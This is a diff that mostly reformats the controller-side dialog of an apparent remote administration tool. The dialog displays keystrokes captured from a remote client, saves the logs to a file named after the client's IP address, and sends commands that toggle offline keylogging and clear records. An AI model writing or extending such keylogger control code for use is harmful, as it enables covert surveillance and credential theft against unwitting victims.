@@ -24,17 +24,17 @@ CKeyBoardDlg::CKeyBoardDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContex
 	//{{AFX_DATA_INIT(CKeyBoardDlg)
 		// NOTE: the ClassWizard will add member initialization here
 	//}}AFX_DATA_INIT
-	m_iocpServer	= pIOCPServer;
-	m_pContext		= pContext;
-	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
-	
+	m_iocpServer = pIOCPServer;
+	m_pContext = pContext;
+	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
+
 	sockaddr_in  sockAddr;
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
 	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
 
-	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_KEYBOARD));
+	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_KEYBOARD));
 	m_bIsOfflineRecord = (BYTE)m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];
 }
 
@@ -62,10 +62,10 @@ END_MESSAGE_MAP()
 /////////////////////////////////////////////////////////////////////////////
 // CKeyBoardDlg message handlers
 
-BOOL CKeyBoardDlg::OnInitDialog() 
+BOOL CKeyBoardDlg::OnInitDialog()
 {
 	CDialogEx::OnInitDialog();
-	
+
 	// TODO: Add extra initialization here
 	SetIcon(m_hIcon, TRUE);			// Set big icon
 	SetIcon(m_hIcon, FALSE);		// Set small icon
@@ -78,11 +78,11 @@ BOOL CKeyBoardDlg::OnInitDialog()
 	BYTE bToken = COMMAND_NEXT;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 	return TRUE;  // return TRUE unless you set the focus to a control
-	              // EXCEPTION: OCX Property Pages should return FALSE
+				  // EXCEPTION: OCX Property Pages should return FALSE
 }
 
 void CKeyBoardDlg::OnReceiveComplete()
-{	
+{
 	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
 	{
 	case TOKEN_KEYBOARD_DATA:
@@ -109,7 +109,7 @@ void CKeyBoardDlg::OnClose()
 	m_pContext->m_Dialog[0] = 0;
 	closesocket(m_pContext->m_Socket);
 	CDialogEx::OnClose();
-//	DestroyWindow();
+	//	DestroyWindow();
 }
 
 void CKeyBoardDlg::AddKeyBoardData()
@@ -119,16 +119,15 @@ void CKeyBoardDlg::AddKeyBoardData()
 	int	len = m_edit.GetWindowTextLength();
 	m_edit.SetSel(len, len);
 
-	TCHAR temp[MAX_PATH*10];
-	MultiByteToWideChar(CP_ACP, 0, (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), MAX_PATH*10, temp, MAX_PATH*10);
+	TCHAR temp[MAX_PATH * 10];
+	MultiByteToWideChar(CP_ACP, 0, (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), MAX_PATH * 10, temp, MAX_PATH * 10);
 	m_edit.ReplaceSel((TCHAR*)temp);
 }
 
-void CKeyBoardDlg::OnSize(UINT nType, int cx, int cy) 
+void CKeyBoardDlg::OnSize(UINT nType, int cx, int cy)
 {
 	CDialogEx::OnSize(nType, cx, cy);
-	
-	// TODO: Add your message handler code here
+
 	ResizeEdit();
 }
 
@@ -144,7 +143,7 @@ void CKeyBoardDlg::ResizeEdit()
 	m_edit.MoveWindow(&rectEdit);
 }
 
-void CKeyBoardDlg::PostNcDestroy() 
+void CKeyBoardDlg::PostNcDestroy()
 {
 	// TODO: Add your specialized code here and/or call the base class
 	delete this;
@@ -155,11 +154,11 @@ bool CKeyBoardDlg::SaveRecord()
 {
 	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.txt"));
 	CFileDialog dlg(FALSE, _T("txt"), strFileName, OFN_OVERWRITEPROMPT, _T("文本文档(*.txt)|*.txt|"), this);
-	if(dlg.DoModal () != IDOK)
+	if (dlg.DoModal() != IDOK)
 		return false;
-	
+
 	CFile	file;
-	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
+	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
 	{
 		MessageBox(_T("文件保存失败"));
 		return false;
@@ -169,17 +168,17 @@ bool CKeyBoardDlg::SaveRecord()
 	m_edit.GetWindowText(strRecord);
 	file.Write(strRecord, strRecord.GetLength());
 	file.Close();
-	
+
 	return true;
 }
 
-BOOL CKeyBoardDlg::PreTranslateMessage(MSG* pMsg) 
+BOOL CKeyBoardDlg::PreTranslateMessage(MSG* pMsg)
 {
 	// TODO: Add your specialized code here and/or call the base class
 	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
 	{
 		return true;
-	}	
+	}
 	return CDialogEx::PreTranslateMessage(pMsg);
 }
 
@@ -191,25 +190,25 @@ void CKeyBoardDlg::UpdateTitle()
 		str += _T(" (离线记录已开启)");
 	else
 		str += _T(" (离线记录未开启)");
-	SetWindowText(str);	
+	SetWindowText(str);
 }
 
-void CKeyBoardDlg::OnEnableOffline() 
+void CKeyBoardDlg::OnEnableOffline()
 {
-			BYTE bToken = COMMAND_KEYBOARD_OFFLINE;
-			m_iocpServer->Send(m_pContext, &bToken, 1);
-			m_bIsOfflineRecord = !m_bIsOfflineRecord;
-			UpdateTitle();
+	BYTE bToken = COMMAND_KEYBOARD_OFFLINE;
+	m_iocpServer->Send(m_pContext, &bToken, 1);
+	m_bIsOfflineRecord = !m_bIsOfflineRecord;
+	UpdateTitle();
 }
 
-void CKeyBoardDlg::OnSaveRecord() 
+void CKeyBoardDlg::OnSaveRecord()
 {
 	SaveRecord();
 }
 
-void CKeyBoardDlg::OnClearRecord() 
+void CKeyBoardDlg::OnClearRecord()
 {
-		BYTE bToken = COMMAND_KEYBOARD_CLEAR;
-		m_iocpServer->Send(m_pContext, &bToken, 1);
-		m_edit.SetWindowText(_T(""));
+	BYTE bToken = COMMAND_KEYBOARD_CLEAR;
+	m_iocpServer->Send(m_pContext, &bToken, 1);
+	m_edit.SetWindowText(_T(""));
 }
